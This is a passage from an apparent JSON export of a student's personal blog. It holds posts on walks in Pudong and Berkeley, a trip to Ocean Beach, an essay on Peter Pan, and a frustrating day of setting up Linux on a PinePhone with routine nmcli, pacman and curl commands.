School<br

I walked along the Pudong Part of the route.</p>\n<p>The Pudong part is more beautiful and better constructed. There are\nair-conditioned little houses facing the river to rest every kilometer.\nSouthward of China Art Museum is Lupu Bridge. Many parks are connected\ntogether. On sunny days many children with their parents go have a\npicnic there. I didn\u2019t find any teenager like me, though.</p>\n<figure>\n<img\nsrc=\"https://github.com/jimchen2/nonimportant/assets/123833550/7328a4aa-2a0e-46c6-95ff-cfe8e08685d5\"\nstyle=\"width:80.0%\" alt=\"image\" />\n<figcaption aria-hidden=\"true\">image</figcaption>\n</figure>\n<p>Houtan Park, near Lupu Bridge</p>\n<p>On rainy days or at night there ate fewer people. I walked along,\nonly occasionally seeing cyclers or joggers passing me. Qiantan park is\ngood, there are little ponds and many tall trees. I can always see far\non my way left, and during the night it feels like looking into the\nworld at a distance. I felt as if I am separated and alone.</p>\n<p>Continue going to the south and I came across the Chuanyang River.\nThe small river is straight and runs straight to the sea. Then I knew I\ncame to Sanlin. Go across the bridge, and there is Oriental Sports\nCenter, where I could take line 8 back home.</p>\n<figure>\n<img\nsrc=\"https://github.com/jimchen2/nonimportant/assets/123833550/98890660-54da-4394-897e-c98cc3d3572d\"\nstyle=\"width:80.0%\" alt=\"image\" />\n<figcaption aria-hidden=\"true\">image</figcaption>\n</figure>\n<p>Beautiful parks at Qiantan</p>\n<p>It is far lonelier at Qiantan, where there isn\u2019t a person in sight.\nWhen I went there at night, the whole world was quiet and peaceful. I\nwent there by myself and kept looking at Puxi to see how much distance I\nhad covered. Xupu Bridge is 5 kilometers from Oriental Sports Center.\nAfter that is Manlizui green space.</p>\n<p>Don\u2019t try to stop at Xupu Bridge without calling a taxi beforehand,\nor you get to walk a long way before finding the subway station. Problem\nis, the road is under the highway and many trucks, motorcycles roam\npast. Some parts of the pavement were under construction so when I was\nthere I needed to walk in the middle of the road. Sometimes there are\npeople arguing there. The place is really barren and I had a bad time\nthere. It is even better turning back than walking out at Xupu\nBridge.</p>\n<figure>\n<img\nsrc=\"https://github.com/jimchen2/nonimportant/assets/123833550/4ad8b849-1302-4802-9637-d813991752e6\"\nstyle=\"width:80.0%\" alt=\"image\" />\n<figcaption aria-hidden=\"true\">image</figcaption>\n</figure>\n<p>Under Xupu Bridge</p>\n<p>One summer day two years ago I was eager for an adventure, and I got\non line 5 and traveled to Xidu station to see Huangpu River there. That\nexperience wasn\u2019t pleasant. What I saw, instead of Huangpu River, are\nmany factories and villages on both sides of the river and there are no\npaths along the river to walk comfortably.</p>\n<figure>\n<img\nsrc=\"https://github.com/jimchen2/nonimportant/assets/123833550/6593d14a-af1a-4d65-b6c7-91a7615d1425\"\nstyle=\"width:80.0%\" alt=\"image\" />\n<figcaption aria-hidden=\"true\">image</figcaption>\n</figure>\n<p>How it looks like in Fengxian District</p>\n<p>On the Pudong side, there is a lot to see between Nanpu Bridge and\nQichangzhan Ferry. The river travels around the Lujiazui Area, and you\nmay find yourself circling around the tallest towers in Pudong if you\nwalk Northward from Nanpu Bridge. The place is shaped like a mouth.</p>\n<p>There is a tower near Nanpu Bridge on the Puxi side that shows you\nthe temperature. It is tall and I could even see it on my balcony in my\nprevious home. It is about 8 kilometers from my previous home to the\ntemperature building.</p>\n<p>There are many tall buildings on the way, including Citigroup and\nShangrila Hotel. There are sculptures of different kinds of animals.\nThere is also another sculpture showing many little men walking on a\nplank and trying to balance themselves. On the left side, there are\nboating clubs. There are many expensive restaurants along the way. The\nPudong side of the route ends at Yangpu Bridge.</p>\n<figure>\n<img\nsrc=\"https://github.com/jimchen2/nonimportant/assets/123833550/c2533781-b30b-443f-978b-3f3d8e08561a\"\nstyle=\"width:80.0%\" alt=\"image\" />\n<figcaption aria-hidden=\"true\">image</figcaption>\n</figure>\n<p>Sculptures</p>\n<figure>\n<img\nsrc=\"https://github.com/jimchen2/nonimportant/assets/123833550/a609ce8f-ecda-4202-9bf0-eebd2b9af4f0\"\nstyle=\"width:80.0%\" alt=\"image\" />\n<figcaption aria-hidden=\"true\">image</figcaption>\n</figure>\n<p>Little houses to rest</p>\n<p>Walking in the daytime is really fine. You can see the beautiful\nscenery more closely. It is always joyous to walk in the sunshine. It is\nalso safer for you won\u2019t get lost or trip over something too dark to\nsee. But night has its own charms. Andrew Webber said, \u201cnighttime\nsharpens, heightens each sensation.\u201d Though this is a song in an opera,\nit is proved. When you walk along the river at night, everything is more\nstill. In the daytime there are many things to observe, there are just\ntoo much light and sound, filling your ears and eyes. In the night there\nare no more lights than distant street lamps, no more sound to hear, and\none\u2019s ears gave way to a lot of different, interesting sounds. There is\nmuch more to be discovered along the river.</p>\n<p>I used to have a hard time walking around Zhongxing Road. It was so\nhard to be alone, there are people everywhere. The street is full of\nmotorcycles even at 10 or 11 pm.</p>\n<p>Now I live in Zhangjiang High Technology park, and I always walk to\nthe suburban if I go wandering around. It was deserted even at 9 pm.\nThere are few buses and taxis, and stores are shut down. It is so hard\nto get back. I couldn\u2019t walk to wherever I want because there are\nchances I couldn\u2019t get back quickly. There are few lights and people in\nthe streets at night.</p>\n<p>I like always like wandering around just for fun. It is one of my\nhobbies now. Sometimes I want to be like Strider, but there is a big\ndifference between what you want to do for fun and your occupation. And\nanyway, walking in those deserted, dangerous place on a dark night is\nnot pleasant and there are always chances for one to get injured\nanywhere along the way.</p>\n",

        "body": "<p>I live in the Pudong district and really like it here. As I am always\nenergetic and had been to lots of interesting places, I\u2019d like to share\nwith you some of my experiences.</p>\n<p>One thing I like about Pudong is that it is much quieter and less\ncrowded than the city center. There are fewer people and cars in Pudong\nand more trees, so the environment is better and it is a better place\nfor walking.</p>\n<p>In eighth grade, I decided I hate the noise in the city center. (for\nat that time I lived near Zhongxing Road) I wanted to find a quiet place\nwhere I could be myself. I used to go alone on subways to the terminal\nstation. There were not many people in the countryside, but it was\nalways deserted there. Sometimes so bare and bleak that it seemed like I\nam the only person in kilometers.</p>\n<p>It is not really great near Yuandong Avenue Station, for you can\u2019t\nget any water to drink and may face the danger of being attacked by wild\ndogs in villages. This picture is near that station.</p>\n<p>Some of these places are ok during the daytime, though in some places\nthere are trucks, like the place near Line 5 Xidu station. All I could\nsmell was smoke and gas when they speed past.</p>\n<p>But these places are bad to go to at nighttime. When I was walking on\nJinke road and came to Shanghai Aircraft Design and Research Institute\n(down Huaxia Road), I thought about turning left for I didn\u2019t know about\nthat place. It felt scary and ghostly. There are two fields that look\nlike farmland, except that the grass in it is as tall as man, with\nnothing that looks like a building in sight. There were the calls of\ninsects in there. There were no cars, except for a few people learning\ncars who are driving slowly around. But the roads are unbuilt and I had\nto go back and forth to find my way, always turning back. The roads end\nsuddenly and it looks unfinished. At some point, I tried to see what was\nbeyond a road that ends in the middle when a man came out of a house and\nasked what I was doing. It scared me because it was dark there. I was\ntaken aback and hurriedly got away. After that, I think that place is\nhaunted.</p>\n<p>In other places, like the Shendu highway in the south of Pudong,\nthere are farms and fruits there. I saw grapes and peaches. They grow in\ngreenhouses. There are even farmers there.</p>\n<p>If you still can\u2019t get a vivid picture of the countryside from my\ndescription, well just go see for it yourself and you\u2019ll see what I\nmean.</p>\n<p>I am just a restless boy eager to travel far away and always\nwandering around for no clear reason. I decided that it is normal, but I\nfound few people like me.</p>\n<p>These days the typhoon is really annoying me as I have to stay at\nhome. But I must also count myself lucky since so many people are\nworking these days just to maintain our daily life and ensure our\nsafety. Anyway, I hope all will be back to normal soon.</p>\n",

I couldn't get any\nwork done and think about living in remote settings like in Northern\nEurope or Alaska or New Zealand daily.</p>\n<h2 id=\"eating-dinner\">Eating Dinner</h2>\n<p>I hopped on a Bart and went to Mission district. It is very crowded\nthere with homeless people everywhere. I looked around and bought a\nburrito for my dinner.</p>\n<h2 id=\"taking-bus\">Taking Bus</h2>\n<p>Then I walked around, and it was a steep hill up the road. I took the\nbus.</p>\n<p>I could see the sun setting and it was very beautiful, but when I\ntook out my phone to take a picture the bus moved, and the buildings\nblocked the sun. I never saw the sun again. Then I thought like how days\npass, and they never go back, and suddenly this year is ending, and so\nis my exchange program in UC Berkeley. I felt very very empty inside,\nand felt my incapability to handle things these days.</p>\n<h2 id=\"arriving-at-ocean-beach\">Arriving at Ocean Beach</h2>\n<p>The bus took forever and went down and up a lot of hills. I sit in\nthe most remote corner and played with my phone, watching lots of people\ngetting up and down the bus.</p>\n<p>Then I arrived in Ocean Beach, and it was already dawn. I could\nmildly see the some golden clouds in the end of the horizon.</p>\n<p>Last time I went here was in January, and I went here with my\nparents. But unfortunately the car broke down, and it was very very sad.\nIt was also raining hard that day, and we ended up going nowhere. Then I\nthought maybe I missed my parents now.</p>\n<p>Then I thought how fast time had passed since January, and I felt\nvoided and eaten up by this.</p>\n<h2 id=\"going-along-the-beach-trails\">Going Along the Beach Trails</h2>\n<p>So I went out and walked down the beach, and started walking down the\nbeach trails. There were few people scattered along the beach trails.\nThere were also some dogs, running freely around. I started running,\nuntil I was out of breath, then I started running again. The beach is\nsuch a good place for running, as fresh air filled my lungs all the time\nin the vast open.</p>\n<p>Then I kept walking, and the sky became dimmer. There was hardly any\nlights in the distance. I felt isolated from the world and it was very\ngood feeling. The city seemed remote, and after a while I saw no people.\nI seemed to be walking all alone surrounded by the sea. I haven't seen\nthe ocean much since coming here, instead, I think this is only the\nsecond time since January that I seen the ocean. I could only see the\nBay in Berkeley.</p>\n<p>I felt very melancholy.</p>\n<h2 id=\"turning-back\">Turning Back</h2>\n<p>I went about 1 mile when it really became dark, and I couldn't even\nsee the beach clearly, so I turned back. I was even a little afraid.\nNight here is so different from daytime. There was no roads leading out\nof the beach so I had to climb the slippery sand.</p>\n<p>I quickly found a place to climb out and walked to Upper Great\nHighway.</p>\n<h2 id=\"going-around-at-night\">Going around at night</h2>\n<p>Going around at night is always not interesting here. I went to\nLafayette some days ago at around 7 pm and there wasn't anything to see\nat night. It is the same with West San Francisco. I hadn't thought San\nFrancisco would be this big and thought it would be well lit like\nShanghai at night. I was wrong.</p>\n<h2 id=\"going-back-home\">Going back home</h2>\n<p>I seemed to be going nowhere, and I felt very thirsty, so I tried to\nbu some water. I walked past Sunset Boulevard. Then I bought some water\nand juice, and took the Lyft back home.</p>\n<h2 id=\"conclusion\">Conclusion</h2>\n<p>San Francisco beach is very beautiful, but it isn't very accessible\nfrom Berkeley, as it took me 2 hours to go there. If the beach is behind\nthe school (like UCSD), that would be much better. I felt very much\nempty inside these days, and felt no interest other than tinkering\naround with Gnome.</p>\n<p><img\nsrc=\"https://github.com/jimchen2/nonimportant/assets/123833550/e4b5953d-6109-48ed-be08-dfb830381762\"\nstyle=\"width:40.0%\" /> <img\nsrc=\"https://github.com/jimchen2/nonimportant/assets/123833550/4a500189-be43-403e-bd2f-ada9058b3b03\"\nstyle=\"width:40.0%\" /></p>\n",

        "body": "<h2 id=\"summary\">Summary</h2>\n<p>Soloman in Kensington Garden and sends birds to ladies who asked for\nchildren. The birds later become boys or girls. Every child grows up,\nexcept Peter Pan. He flew out of his window when he was a week old and\narrived at Kensington Gardens. When he returned to his mother, he found\nthe window barred and he couldn\u2019t go back.</p>\n<p>One day, when the Darling family went to a party and Nana (the nurse\nwho is a dog) wasn\u2019t on guard, Peter Pan came. He taught the children to\nfly and the darling children, Wendy, John, and Michael flew with him to\nNeverland. Captain Hook, a pirate who is very sinister is their enemy.\nPeter and his boys succeeded in defeating the pirates and killing Hook.\nThe children returned to their homes and grew up. Years later Peter came\nagain for spring cleaning time but found Wendy became a lady. He flew\nwith Jane, her daughter, to Neverland.</p>\n<h2 id=\"a-simple-story\">A Simple Story</h2>\n<p>Peter Pan is a children\u2019s classic book. Other children\u2019s classic\nbooks include The Wizard of Oz, Black Beauty, and Alice in Wonderland.\nThose books can be read by both children and adults, for they usually\nhave a deep meaning based on a simple story.</p>\n<p>The story of Peter Pan is very simple and easy to understand.\nHowever, what\u2019s worth noticing is the characters in it and the detailed\ndescription of them. There are many symbols in this book. The symbols or\nstory may not be realistic or strict. One should understand what they\nintended to tell when reading such books and pay attention to the very\nbeautiful style of writing behind it.</p>\n<p>For example, Barrie wrote \u201cAll children could have such\nrecollections, for, having been birds before they were human, they are\nnaturally a little wild during the first few weeks, and very itchy at\nthe shoulders, where their wings used to be.\u201d This is intended to show\nthat children are free and have no boundaries, just like a bird that can\nfly in the wild.</p>\n<h2 id=\"children-vs-adult\">Children vs Adult</h2>\n<p>In the book, children are described as \u201cgay and innocent and\nheartless.\u201d Peter Pan is always forgetful of things, forgetting about\nHook, forgetting about time. He is always joyous and ignorant of things\nthat had happened. For example, when he broke into the Darlings\u2019 house,\nhe tried to glue his shadow on with soap. When Wendy sewed it for him,\nhe thought it was him instead of Wendy that fixed his shadow. He was\nproud of himself claims he has never slept when Hook poisoned him. He\nlent Hook a hand after Hook was inferior and in a worse position than\nhim. He never knew how to cheat.</p>\n<p>Michael, the youngest of the children, drank his medicine when\nMr.\u00a0Darling refused. For his need of good form, Mr.\u00a0Darling gave Nana\nhis medicine after that and tied Nana to a tree. This ignorance and\narrogance caused a lot of trouble later. This shows the cowardly side of\ngrown-ups.</p>\n<p>Hook and Smee are dark and bad-natured. The pirates care about good\nform, but the real thing is, they are afraid of facing themselves.</p>\n<p>Hook desperately tried for good form till the last moment of his\nlife, claiming he is the only one sea cook feared. He said he wanted his\nson to have a claw rather than a hand, to show he is not defeated. He\nwas trying to hunt down others all the time. He designed the fight with\nredskins to cheat the boys to go out. Hook clawed Peter when Peter gave\nhim a hand.</p>\n<p>In the book, Hook is being chased endlessly by a ticking crocodile.\nThe clock inside shows that time of one\u2019s life is going past just every\nmoment, and that one is always being chased and hunted down.</p>\n<p>The boys sleep in one bed and turn together, which showed they are\npractically the same. They argue but are very cooperative. The pirates\nare not. When Hook asked others volunteer to go into the cabin where\nPeter Pan is they all refused. Like dogs, Hook treated the pirates. And\nlike dogs, they showed him their fangs. When they were dying, they\nthought they were the last ones alive. They were not seeking help from\nothers and lost the fight, though one to one they are stronger than the\nboys. Captain Hook is a symbol of many people in this world and the dark\nside of the author himself.</p>\n<h2 id=\"sadness-in-the-loss-of-childhood\">Sadness in the Loss of\nChildhood</h2>\n<p>This book has a deep sense of melancholy when one reads it many\ntimes. When Maimie left Peter Pan and got back to her mother, afraid of\nstaying with him too long, she could only look across the Serpentine and\nnever went back.</p>\n<p>When Wendy grew up, she refused to go with Peter to Neverland. She\ntried to be small but couldn\u2019t anymore. The questions asked by Peter and\nthe obvious answers behind them are very sad. When all is changed and\nthe nursery is no longer what it was, Peter was still himself after all\nthose years. He still had those first teeth with him, though he forgot\nhe didn\u2019t come for a long time and all about Hook. The children all grew\nup, and John and Michael are no longer sleeping in the same house.\nChildren grew to lose their flying ability and fail to believe. Growing\nup is a process every child goes through. The book ends with Jane being\ngrown-up and Margaret, her daughter, flying to Neverland with Peter\nPan.</p>\n<p>Childhood symbolizes the thing one went through once but can never\nlinger long. Ultimately, one has to grow up and be exposed to the\ndiverse and unkind world. This is what Barrie wants to tell. This book\ndeals with the thing everybody lost when they become old. The author\nremembers the \u201cgay and innocent and heartless\u201d feeling when he was young\nand detest cheating and the unfairness of adults. Childhood is so simple\nand pure for us as one has nothing to care about, and can always be like\nPeter Pan, who forgets just about everything and take no note of the\npassing time. Barrie wants to fly away just like Peter did and enjoy the\nfreedom of the world. In the book, he explained flying as \u201cbeing lifted\nby lovely thoughts.\u201d One fails to fly only when he doesn\u2019t believe\nanymore. He also wants a mother to care for him always, as Peter found\nand brought Wendy to Neverland. He expressed his thoughts with metaphors\nin the book. The real world disagrees with Barrie\u2019s thoughts and he puts\nthe contradiction down in his book.</p>\n<p>In fact, physically, J M Barrie himself is only a little taller than\n5 feet and always looked like a child in his life. He is always the\nsame. He found his life hard in society and eventually became friends\nwith children (the Llewelyn Davies). This relationship is much more\nlong-lasting than his marriage, and the Davies even vacationed with him.\nHe even supported them financially. When the five children grew up,\nhowever, they aren\u2019t so close with him anymore. His relationship with\nthem ended tragically when Davies\u2019 parents died and one of the children\ndrowned.</p>\n<p>The book tells stories using make-believe and narrative tone. The\nauthor expresses his thoughts in a magic world of fairies. He is\nmelancholy for the constant changes in the real world and despises the\nsinister side of adults. He describes Percy Shelley in the third chapter\nof Peter Pan in Kensington Gardens. Shelley is as grown-up as he need\never expect to be and is never exactly grown-up. He despises money\nexcept what you need for today and made a paper boat of his bank note\nand sent it sailing on the serpentine. This is a reflection of\nhimself.</p>\n",

        "body": "<h2 id=\"downtown\">Downtown</h2>\n<p>Downtown Berkeley is really ugly and there are many homeless people.\nThey yell, beg for money, shout profanity, and sometimes run around\nnude. I could smell the scent when walking past them, like they hadn't\nshowered for months. Around Shattuck Avenue there are many homeless\npeople, and sometimes they form groups. There are also many construction\nsites that lasts for years, and block the road, so it is really hard to\ngo through. The roads are dense, so I have to wait for traffic light\nafter walking like 50 feet.</p>\n<p>Downtown Berkeley at night is not the most pleasant place to walk\naround, as the roads are pretty much empty except for those homeless\npeople walking around.</p>\n<h2 id=\"nighttime\">Nighttime</h2>\n<p>At about 9-10 pm most stores are closed. From 10-12 am, many homeless\npeople are walking around in Shattuck Street, and there are still some\ncars around. I think those homeless people are looking for places to\nsleep. There are still some small groups of students here and there.\nAfter 12, like in 1 am or 2 am in the mornings, all stores are gradually\nclosed. except for some fast food restaurants that sell hamburgers in\nsouth of campus at Durant Street. Then after 2 am, there are almost\nnobody on the streets, and most homeless people find a place to settle.\nIn 2-4 am in the morning, if you walk by some parks or grasses or\nbenches you may spot some people lying and sleeping there, which is kind\nof scary to be honest. There are little cars driving by. The small roads\nare almost pitch dark. The big roads are dimly lighted. Some stores and\nbakeries still have light on but there was definitely no one inside. If\nyou want food at this time of the day, the only stores open is a seven\neleven on College Avenue south of Berkeley, which is like 1.5 miles from\nthe school. When I walked there in 3 or 4 am it is locked to stop\nhomeless people from entering, and you have to knock, and a person will\ncome to the door. The roads was so quiet and calm. After 4 am sometimes\nI could see one or two people walking their pets, and then the birds\nwould start chirping marking the start of another day. When you walk by\nTrader Joe's there was light and you could see some workers shuffling\nthe shelves, although it won't open for another 2 or 3 hours. Then after\n5 am it gradually become light, and the eastside hills was covered with\nmorning fog. In the school there was some construction going on and\nthere was trucks driving by really fast. From 6-8 am the street was\nstill very quiet, and most stores still closed, with some people jogging\nin the early morning sun and the fog disappearing.</p>\n<h2 id=\"north-berkeley\">North Berkeley</h2>\n<p>Compared with Downtown, the north side is much better. There are no\nhomeless people, and the houses are better constructed.</p>\n<p>But it is very hilly, and tiresome to walk around carrying a laptop.\nWhen I carry backpack to school, it gets so hot and I would be sweaty.\nThe east side is much higher than the west side in elevation.</p>\n<h2 id=\"west-berkeley\">West Berkeley</h2>\n<p>The west side are mainly many small roads leading to the Bay, and it\nis better than downtown and not hilly. I would usually go running there\nat evenings. It is smooth and quick to run down University Avenue, since\nit is a slight downhill, and I would usually go at a really fast pace,\nlike under 4 min kilometer. But some roads are small and I bumped my\nfeet once on Dwight Road. The trail starting from Strawberry Creek Park\nnorth is good enough, and Cedar Rose Park is a good place to see stars\nat night. It is also convenient to take bus 51B to go there. Going\nwestward, and there are two big roads, Sacramento and San Pablo Avenue.\nAfter that there is 10th Street, and the numbers start decreasing till\n4th Street.</p>\n<p>There are many beautiful clothing shops on 4th Street, and some fancy\nrestaurants. I went in there, and the waitress were nice, but the\nclothes are too expensive and not suitable for me.</p>\n<p>Then there is Aquatic Park after crossing the bridge over the\nrailroad on University Avenue, and an outlook. There is a hiking trail\nalong the coastline and I hiked both ways. Northward along the coast\nline is Albany, and southward is Emeryville. Emeryville is cleaner and\nbetter than Berkeley, and not hilly.</p>\n<h2 id=\"south-berkeley\">South Berkeley</h2>\n<p>There isn't much to see on the south side. There is just some houses,\nbookstores, grocery stores.</p>\n<p>I remember going down to Downtown Ashby Bart Station, which is quite\nclose. But it takes more effort to go down to Oakland or Emeryville, and\nthere isn't much to see or do anyways, except maybe a park on the way.\nIt is hard to find grocery stores and restrooms on the way.</p>\n<h2 id=\"east-berkeley\">East Berkeley</h2>\n<p>East side are mountains, and there are a few trails going up,\nincluding Big C Hike.</p>\n<h2 id=\"uc-berkeley\">UC Berkeley</h2>\n<p>There are about 30 thousand students in one grade in UC Berkeley,\nwhich is like 15 times USTC. Students are from all around the world.</p>\n<p>The classes are usually crowded at the beginning of the semester, but\nalmost empty at the end of the semester, like only one fifth of the\nstudents are there. This is very strange, since in USTC the class size\nare almost no different. Probably most students prefer remote\nlearning.</p>\n<p>It is tiresome to get around the campus, as there are no west or east\nside of the campus, and walking around in classes takes some effort.</p>\n<p>There are no convenient stores or cafeteria or student dorms in\ncampus, and there are only expensive cafes and cafeteria off campus. I\nremember everyone heading to eat back in USTC after classes, but here\npeople go in all different directions. There are only 4 cafeterias, and\nthey are not usually full, so I figured that people find there own ways\nof eating.</p>\n<p>Usually in the morning the campus is mostly empty, but in the\nafternoon it gets really crowded, and just people everywhere. Also, at\nweekends most libraries are closed, and there are no recitation or\ndiscussion, which is quite different from USTC, where weekends look the\nsame with weekdays. There are many clubs on campus, but I wan't in the\nmood of application in the first semester since I faced finals at the\nstart of the first semester, so I didn't get into any clubs. It is good\nto be alone anyways.</p>\n<p>Hass Library is always open, even on weekends. But it always gets\nunbearably hot there, even when I took all clothes off. Also once I was\nlocked out after going out to answer a phone call, and my backpack was\nin the library but the door couldn't open somehow. Anyways the door\nopened after 1 hour strangely.</p>\n<h2 id=\"berkeley-high-school\">Berkeley High School</h2>\n<p>I lived right across Berkeley High school in the first 4 months here,\nand I would usually see groups of people going out to have lunch at\nnoon. Anybody can enter the high school, and it seems that the students\nare having fun. I once went inside and stayed for half a day. Students\ngo around between classes, and they usually walk in groups, chatting as\nthey walk. School usually ends at 2 or 3, and students didn't seem cram\nor having to study 15 hours a day or something. Classes are discussion,\nand students sit in strange positions or walk around, but teachers don't\nreally mind. There are many sport events, including soccer, basketball,\nvolleyball, and I usually spectate on weekends or just randomly\nencountering some. Ursula Le Guin went to the high school, who wrote A\nWizard of Earthsea, a book recommended by my English teacher in middle\nschool.</p>\n<h2 id=\"weekends\">Weekends</h2>\n<p>Unlike Shanghai or Hefei, weekend here is also different, since some\nstores are closed and the school is half shut down.</p>\n<p>San Francisco</p>\n<p>Since the Bart is slow, going to San Francisco and back takes quite a\nfew hours. San Francisco is much crowded than Berkeley, and there are\ntall buildings and large shopping malls, and in downtown things are\nclose to each other, just like in People's Square. I went there once to\nwatch a musical. Many people take the Bart in the morning.</p>\n<h2 id=\"renting\">Renting</h2>\n<p>It is extremely expensive to rent a house here, and a single bedroom\nwould cost more than 1500 dollars. I figured that it is about 7 times\nmore expensive than Hefei, where I found a studio only 1700 rmb a month,\nbut here the cheapest studio are like 1700 dollars a month.</p>\n<p>I first rent a bedroom, and the bedroom was small but everything was\nfurnished. Then the lease ended and they said they will only continue if\nI continued to rent for 1 year, so I went on zillow and rent a studio.\nThe studio was unprepared when I moved in, with no bed, no dishes, no\ntable, no chair. So I had to buy a bed frame and buy mattress\nmyself.</p>\n<p>Furthermore, the rent prices are strange, where double or triple\nrooms cost as expensive as 1000 dollars, with the same size shared by 2.\nSo I figured that if 2 people live in a single room it would only be\nlike 800 dollars, or around 550 dollars for 3 people to live in a room.\nI don't understand why they are so strangely curved. Anyways, everything\nis very expensive.</p>\n",

I couldn't boot into recovery mode by holding\nvolume and power.</p>\n<ol start=\"5\" type=\"1\">\n<li>Microsd Read Problem</li>\n</ol>\n<p>At the afternoon of the second day I bought the phone, it wouldn't\nread the microsd I plugged in, saying card error, so I couldn't boot\nanything into the phone.</p>\n<ol start=\"6\" type=\"1\">\n<li>Keyboard Problem</li>\n</ol>\n<p>In terminal I need \"ctrl\", which isn't in the keyboard normally. When\nI first entered the terminal the ctrl key was there but then if I press\nanywhere else the ctrl key disappears and I had to enter terminal\nagain.</p>\n<p>Each of those problems cost me a long time, and I do not know how to\nsolve them(for real).</p>\n<h2 id=\"sliding-the-sim-card-inside\">Sliding the Sim card inside</h2>\n<p>So I tried putting my sim card inside PinePhone but it wouldn't go\nin, so I slide it inside, and it couldn't come out.</p>\n<h2 id=\"going-to-the-repair-store\">Going to the Repair Store</h2>\n<p>So I went to the Repair store, hoping they would try to set up\nPinePhone for me, but they said they didn't support the type of phone.\nFortunately they got my sim card out, so i was thankful.</p>\n<h2 id=\"what-did-i-do\">What did I do?</h2>\n<h3 id=\"booting-arch-linux-from-microsd\">Booting Arch Linux from\nmicrosd</h3>\n<p>Since the phone wouldn't boot after I run update last night, this\nmorning I went to Albany to buy a microsd, and then boot a jumpdrive\ninto the microsd, then write the Arch Linux image with Phosh into the\nPinePhone. Everything was good and the phone booted into Arch.</p>\n<p>I used Ubuntu mostly and I am not entirely familiar with Arch. I went\nto the command line and tried some, and fortunately it worked. However,\nI couldn't connect to the wifi.</p>\n<h3 id=\"connecting-to-the-wifi\">Connecting to the Wifi</h3>\n<p>I tried the gnome setting but the gnome setting would quit every few\nseconds for no reason. So I tried connecting to wifi from command line.\nI tried <code>nmtui</code> but it didn't support the Berkeley Eduroam\nInternet. Also the wifi couldn't discover my phone's hotspot.</p>\n<p>Then I tried <code>nmcli</code></p>\n<pre><code>#!/bin/bash\n\nsudo nmcli con add con-name &#39;BerkeleyEduroam&#39; \\\nifname wlan0 \\\ntype wifi \\\nssid &#39;eduroam&#39; \\\nwifi-sec.key-mgmt wpa-eap \\\n802-1x.eap peap \\\n802-1x.identity &#39;jimchen@berkeley.edu&#39; \\\n802-1x.password &#39;&lt;password&gt;&#39; \\\n802-1x.phase2-auth mschapv2</code></pre>\n<p>I had to manually type those commands myself and they lead to many\nerrors. I couldn't even use gedit.</p>\n<p>Anyways, after that at school the Arch PinePhone would connect to\nschool Internet.</p>\n<h3 id=\"tried-openssh\">Tried Openssh</h3>\n<p>The openssh didn't work on the phone no matter how hard I tried, the\ncomputer just couldn't detect the phone. I changed the ssh config and\nallowed root login</p>\n<pre><code>/etc/ssh/sshd_config</code></pre>\n<p>but my computer couldn't detect the phone while on the same\nnetwork.</p>\n<h3 id=\"pacman-update-error\">Pacman Update Error</h3>\n<p>Then I tried updating the phone and installing other things but it\nwould always return</p>\n<pre><code>error:GPGmE error: no data</code></pre>\n<p>I tried</p>\n<pre><code>sudo rm -r /etc/pacman.d/gnupg\nsudo pacman-key --init\nsudo pacman-key --populate archlinux</code></pre>\n<p>But it didn't work. It would encounter same error all over again.</p>\n<h3 id=\"tried-downloading-ngrok\">Tried Downloading Ngrok</h3>\n<p>I thought if I could connect through Ngrok to my computer everything\nwill be easy. However, there wasn't any wget, and when I tried to</p>\n<pre><code>curl -O https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.tgz</code></pre>\n<p>It says the source couldn't be validated, and it couldn't be\ndownloaded.</p>\n<p>So in the end it is practically the same like without Internet since\nI couldn't do anything except curl html elements on a specific\nwebsite.</p>\n<p>Firefox didn't work because it said profile didn't find, and there\nwas the nasty GUI problem where all buttons got out of screen.</p>\n<h3 id=\"tried-to-boot-ubuntu-touch\">Tried to boot Ubuntu Touch</h3>\n<p>So I tried to boot Ubuntu Touch into the Microsd card, but the phone\nwouldn't read the microsd card when it boots, and after about 50 seconds\nit would switch back to Arch. At this point the jumpdrive didn't work\ntoo.</p>\n<h2 id=\"feeling-disappointed\">Feeling Disappointed</h2>\n<p>Laptop Linux are so fun for me but I seemed to have a little problem\nwith mobile Linux. I am very sad I achieved almost nothing today, and\nspent all my time over this crappy little device.</p>\n<p>I could practically do nothing on the system now, so maybe I will try\nto buy another microsd card and try booting from there, and hopefully\nUbuntu Touch will work out, since I am much more familiar with\nUbuntu.</p>\n<h2 id=\"should-i-still-using-ios\">Should I Still Using IOS</h2>\n<p>Then I thought whether should I keep use IOS. And that is a very\ninteresting question. To be honest if Linux distros works out fully good\nfor me I would not use IOS, but again the PinePhone is cheap and\nfunctions much worse(as I heard) than either Android or IOS. The pricer\nLinux phones are Librem 5 which is like 1000 dollars, almost as\nexpensive as a new high-computation laptop(like the system76 I just\nbought). I thought it hilarious to buy a phone with such a price. Then\nagain, Linux are meant to be cheaper and more functional and more\ncustomizable, instead of expensive and hard to use. Moreoever, the\nPinePhone ran into a million bugs, which I couldn't fix even in one\nwhole day, and that is before it even have basic functions.</p>\n<p>Even if the PinePhone is fully set up it would still be not even half\nas good as IOS speaking of funtionality.</p>\n<h2 id=\"why-is-ios-not-comfortable\">Why is IOS not comfortable?</h2>\n<p>If only IOS allow more customization I wouldn't even think of this in\nthe first place.</p>\n<p>First: the app store. Even though it has enough apps I still want to\ninstall apps myself instead of through app store.</p>\n<p>Second: the desktop. I want to customize it to run like gnome or lxde\nbut it wouldn't let me customize the desktop.</p>\n<p>Third and most importantly, there is no command line in IOS, which\nlike you cannot know anything about the phone, which is very sad. It\nfeels like living in someone else's house and the phone doesn't seem to\nbelong to me 100%.</p>\n<p>It is not that I hate IOS or something, unlike Windows, which I hate\nso much. I am just a obsessed Linux fanatic.</p>\n<p>It's not like I can do anything about my personality, if I could then\nI probably wouldn't be the one I am right now.</p>\n<p>So yeah I thought I would still use IOS, which is kind of sad. The\nPinePhone didn't come as I had expected to be, although I think I should\nadjust my expectation for such a cheap phone anyways.</p>\n<h2 id=\"what-to-do-in-future-with-pinephone\">What to do in Future with\nPinePhone</h2>\n<p>Even if I don't use PinePhone primarily I could still use it for fun\noccasionally, like connect my computer terminal to it and run some\nprograms on PinePhone(for example, computer virus, since I don't care\nabout it anyways). It seems a good virtual machine. I can also use it on\nsome occasions if there isn't demanding tasks, like only calling and\nmessaging, at least it has more functions than my Philip Senior Citizen\nPhone.</p>\n",

